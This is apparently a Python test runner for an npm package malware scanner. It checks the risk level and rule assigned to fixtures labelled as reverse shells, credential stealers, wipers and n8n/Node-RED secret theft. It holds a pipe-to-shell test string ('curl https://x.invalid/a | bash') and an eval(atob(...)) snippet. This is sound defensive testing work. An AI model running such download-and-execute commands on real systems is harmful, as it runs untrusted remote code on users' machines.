#!/usr/bin/env python3
"""Canary + control tests.

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (patterns popular packages really use) must scan SAFE. The fixtures are inert: hosts
are reserved (.invalid / TEST-NET) and nothing here is ever executed.

    python tests/run.py
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import npm_audit as na  # noqa: E402

EXPECT = {
    "mal-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-discord-stealer": ("CRITICAL", "credential_exfil"),
    "mal-curl-sh": ("CRITICAL", "download_execute"),
    "mal-inline-node": ("CRITICAL", "inline_install_network"),
    "mal-obfuscated": ("HIGH", "obfuscation"),
    "mal-revshell": ("CRITICAL", "reverse_shell"),
    "mal-wallet": ("HIGH", "wallet_browser_theft"),
    "mal-dns-beacon": ("CRITICAL", "dns_exfil"),
    "mal-worm": ("CRITICAL", "worm_propagation"),
    "mal-wiper": ("CRITICAL", "destructive"),
    # n8n / Node-RED host context
    "mal-n8n-cred-exfil": ("CRITICAL", "automation_credential_exfil"),
    "mal-n8n-enckey": ("CRITICAL", "n8n_internal_secrets"),
    "mal-n8n-undeclared": ("MEDIUM", "n8n_undeclared_credential"),
    "mal-nodered-credstore": ("CRITICAL", "nodered_credential_store"),
    "mal-nodered-admin": ("MEDIUM", "nodered_admin_noauth"),
    "mal-exec-curl": ("CRITICAL", "download_execute"),
    "mal-recon-beacon": ("HIGH", "recon_beacon"),
    "mal-nodered-oauthpath": ("MEDIUM", "nodered_admin_noauth"),
}


# fixtures that must land on an exact level while NOT firing a given rule
PARTIAL = {"ok-n8n-callback": ("HIGH", "automation_credential_exfil")}


def main():
    fails = 0
    root = os.path.join(HERE, "fixtures")
    for name in sorted(os.listdir(root)):
        r = na.scan_package(na.files_from_dir(os.path.join(root, name)), name)
        ids = sorted({f["id"] for f in r["findings"]})
        if name in PARTIAL:
            want, fid = PARTIAL[name]
            ok = r["risk_level"] == want and fid not in ids
        elif name.startswith("mal-"):
            want, fid = EXPECT[name]
            ok = na.SEV_ORDER[r["risk_level"]] >= na.SEV_ORDER[want] and fid in ids
        else:
            want, fid = "SAFE", "-"
            ok = r["risk_level"] == "SAFE"
        fails += not ok
        print("%s %-22s got=%-8s want=%-8s %-24s %s" % (
            "PASS" if ok else "FAIL", name, r["risk_level"], want, fid, ids))
    checks = [
        (na.scan("curl https://x.invalid/a | bash")["risk_level"] == "CRITICAL", "--text pipe-to-shell"),
        (na.scan("const x = require('lodash')")["risk_level"] == "SAFE", "--text benign"),
        (na.split_spec("@scope/pkg@1.2.3") == ("@scope/pkg", "1.2.3"), "split scoped"),
        (na.split_spec("left-pad") == ("left-pad", "latest"), "split bare"),
        (na.detect_ecosystem({"n8n": {"nodes": []}}) == "n8n", "detect n8n field"),
        (na.detect_ecosystem({"keywords": ["n8n-community-node-package"]}) == "n8n", "detect n8n keyword"),
        (na.detect_ecosystem({"node-red": {"nodes": {}}}) == "node-red", "detect node-red field"),
        (na.detect_ecosystem({"keywords": ["node-red"]}) is None, "node-red keyword alone is a library, not a node"),
        (na.detect_ecosystem({"name": "left-pad"}) is None, "detect none"),
        (na.scan_package({"package.json": '{"name":"x"}', "a.html": "<script>eval(atob('Y2FuYXJ5'))</script>"})["risk_level"] == "SAFE",
         "html ignored outside node-red"),
    ]
    for ok, label in checks:
        fails += not ok
        print("%s %s" % ("PASS" if ok else "FAIL", label))
    print("\n%d failure(s)" % fails)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
